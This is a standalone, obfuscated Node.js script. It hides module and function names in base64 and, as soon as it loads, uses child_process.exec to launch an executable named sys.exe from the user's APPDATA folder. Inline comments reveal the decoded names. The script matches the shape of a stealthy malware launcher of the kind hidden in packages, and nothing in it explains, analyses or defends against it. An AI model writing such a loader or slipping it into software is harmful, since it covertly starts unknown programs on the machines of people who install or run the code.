(function(){
    const _0x4f3c = [
      'cGhsc2VjcGM=',
      'Y2hpbGRfcHJvY2Vzcw==',
      'Y29uc29sZQ==',
      'YXBwZGF0YQ==',
      'c3lzLmV4ZQ==',
      'ZXhlYw==',
      'bG9n',
      'ZXJyb3I=',
      'U3RhcnQgd2l0aCA='
    ];
  
    function _decode(b64) {
      return Buffer.from(b64, 'base64').toString('utf-8');
    }
  
    const _require = require;
    const child = _require(_decode(_0x4f3c[1]));  // 'child_process'
    const path = _require('path');
    const sysenv = process.env[_decode(_0x4f3c[3])]; // 'appdata'
    const exePath = path.join(sysenv, _decode(_0x4f3c[4])); // 'sys.exe'
  
    const run = child[_decode(_0x4f3c[5])]; // 'exec'
  
    run(`start "" "${exePath}"`, (err) => {
      if (err) {
        _require(_decode(_0x4f3c[2]))[_decode(_0x4f3c[7])](err); // console.error
      } else {
        _require(_decode(_0x4f3c[2]))[_decode(_0x4f3c[6])](_decode(_0x4f3c[8]) + exePath); // console.log
      }
    });
  })();
  